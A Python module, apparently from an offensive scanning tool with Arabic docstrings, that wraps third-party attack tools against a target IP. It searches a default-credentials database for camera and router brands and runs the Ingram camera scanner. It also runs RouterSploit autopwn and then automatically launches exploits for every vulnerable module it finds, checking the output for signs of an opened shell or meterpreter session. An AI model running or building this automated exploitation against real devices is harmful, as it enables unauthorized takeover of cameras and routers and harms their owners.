import os
import csv
import subprocess
import sys

from engines.utils import log, get_target_dir


def _tool_env(tool_path: str) -> dict:
    env = os.environ.copy()
    env["PYTHONPATH"] = tool_path + os.pathsep + env.get("PYTHONPATH", "")
    env["GIT_TERMINAL_PROMPT"] = "0"
    return env


def _ensure_tool_requirements(req_path: str) -> None:
    if not os.path.isfile(req_path):
        return
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "-q", "-r", req_path],
        check=False,
    )


def _ensure_routersploit_ready() -> bool:
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "-q", "setuptools", "telnetlib3"],
        check=False,
    )
    try:
        import pkg_resources  # noqa: F401
        return True
    except ImportError:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "-q", "setuptools==69.5.1"],
            check=False,
        )
        try:
            import pkg_resources  # noqa: F401
            return True
        except ImportError:
            return False


class ExternalTools:
    """وحدة ربط الأدوات الخارجية (GitHub Tools) ببرنامجنا"""

    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.tools_dir = "tools"
        self.t_dir = get_target_dir(target_ip)

    def search_default_creds(self, product_name):
        """البحث في قاعدة بيانات كلمات المرور الافتراضية"""
        creds_file = f"{self.tools_dir}/DefaultCreds-cheat-sheet/DefaultCreds-Cheat-Sheet.csv"
        found_creds = []

        if not os.path.exists(creds_file):
            log("DefaultCreds database not found. Run scripts/install_tools.sh or scripts/install_tools.bat first.", "ERROR")
            return found_creds

        log(f"Searching default credentials for: {product_name}...", "INFO")
        try:
            with open(creds_file, "r", encoding="utf-8", errors="ignore") as f:
                reader = csv.reader(f)
                for row in reader:
                    if len(row) >= 3:
                        if product_name.lower() in row[0].lower():
                            found_creds.append({"product": row[0], "user": row[1], "pass": row[2]})
                            log(f"  Default Cred Found: {row[0]} -> {row[1]}:{row[2]}", "SUCCESS")
        except Exception as e:
            log(f"Error reading creds database: {e}", "ERROR")

        return found_creds

    def run_ingram_scan(self):
        """تشغيل ماسح Ingram للكاميرات"""
        ingram_path = os.path.join(self.tools_dir, "ingram")
        if not os.path.isdir(ingram_path):
            log("Ingram not found. Run scripts/install_tools.sh or scripts/install_tools.bat first.", "ERROR")
            return

        entry_script = os.path.join(ingram_path, "run_ingram.py")
        if not os.path.isfile(entry_script):
            log("Ingram entry script run_ingram.py not found. Re-run scripts/install_tools.sh", "ERROR")
            return

        _ensure_tool_requirements(os.path.join(ingram_path, "requirements.txt"))
        log(f"Running Ingram Camera Scanner on {self.target_ip}...", "INFO")

        targets_file = os.path.join(ingram_path, "targets.txt")
        out_dir = os.path.join(self.t_dir, "ingram_output")
        os.makedirs(out_dir, exist_ok=True)

        with open(targets_file, "w", encoding="utf-8") as f:
            f.write(self.target_ip + "\n")

        result = subprocess.run(
            [
                sys.executable,
                "run_ingram.py",
                "-i",
                "targets.txt",
                "-o",
                out_dir,
                "-p",
                "80",
                "81",
                "443",
                "554",
                "8000",
                "8080",
                "37777",
                "-t",
                "100",
                "-T",
                "10",
            ],
            cwd=ingram_path,
            env=_tool_env(ingram_path),
            capture_output=True,
            text=True,
            check=False,
        )

        if result.returncode != 0:
            detail = (result.stderr or result.stdout or "unknown error").strip()
            log(f"Ingram scan failed: {detail[-400:]}", "ERROR")
            return

        log(f"Ingram scan completed. Results: {out_dir}", "SUCCESS")

    def run_routersploit_scan(self):
        """تشغيل RouterSploit وإرجاع قائمة الثغرات المكتشفة"""
        rs_path = os.path.join(self.tools_dir, "routersploit")
        rsf_script = os.path.join(rs_path, "rsf.py")
        if not os.path.isfile(rsf_script):
            log("RouterSploit not found. Run scripts/install_tools.sh or scripts/install_tools.bat first.", "ERROR")
            return []

        if not _ensure_routersploit_ready():
            log("RouterSploit needs setuptools: pip install setuptools", "ERROR")
            return []

        _ensure_tool_requirements(os.path.join(rs_path, "requirements.txt"))

        log(f"Running RouterSploit Autopwn on {self.target_ip}...", "INFO")
        found_vulns = []

        try:
            cmd = [sys.executable, "rsf.py", "-m", "scanners/autopwn", "-s", f"target {self.target_ip}"]
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                cwd=rs_path,
                env=_tool_env(rs_path),
            )

            for line in process.stdout:
                line = line.strip()
                if "is vulnerable" in line.lower():
                    parts = line.split()
                    for p in parts:
                        if "exploits/" in p or "exploits\\" in p:
                            found_vulns.append(p)
                            log(f"Found Vulnerability: {p}", "SUCCESS")

                if line and not any(x in line for x in ["rsf >", "pkg_resources", "UserWarning"]):
                    print(f"  [RSF] {line}")

            process.wait()
            if process.returncode != 0 and not found_vulns:
                log(
                    "RouterSploit failed. On Kali run: "
                    "pip install setuptools && pip install -r tools/routersploit/requirements.txt",
                    "ERROR",
                )
            return found_vulns
        except Exception as e:
            log(f"RouterSploit scan failed: {e}", "ERROR")
            return []

    def run_routersploit_exploit(self, module_path):
        """محاولة استغلال الثغرة المكتشفة تلقائياً — returns True if exploit likely succeeded."""
        rs_path = os.path.join(self.tools_dir, "routersploit")
        module_path = module_path.replace("\\", "/")

        log(f"ATTEMPTING AUTO-EXPLOIT: {module_path} on {self.target_ip}...", "WARNING")

        try:
            cmd = [
                sys.executable,
                "rsf.py",
                "-m",
                module_path,
                "-s",
                f"target {self.target_ip}",
            ]

            log("Launching exploit payload...", "INFO")
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=rs_path,
                env=_tool_env(rs_path),
                check=False,
            )

            print("\n" + "=" * 40)
            print("      EXPLOIT OUTPUT / RESULTS")
            print("=" * 40)
            print(result.stdout)
            print("=" * 40)

            out_lower = (result.stdout or "").lower()
            success_markers = (
                "welcome to cmd",
                "success",
                "shell opened",
                "command shell",
                "meterpreter",
                "exploit completed",
            )
            if any(m in out_lower for m in success_markers):
                log(f"EXPLOIT SUCCESSFUL ON {self.target_ip}!", "SUCCESS")
                return True

            log("Exploit launched, check output for details.", "INFO")
            return False

        except Exception as e:
            log(f"Auto-exploit failed: {e}", "ERROR")
            return False

    def get_all_default_passwords(self):
        """جمع كلمات المرور الافتراضية لأشهر الأجهزة"""
        products = ["hikvision", "dahua", "zte", "tp-link", "mikrotik", "cisco", "dlink", "huawei"]
        all_creds = []
        for p in products:
            creds = self.search_default_creds(p)
            all_creds.extend(creds)
        return all_creds
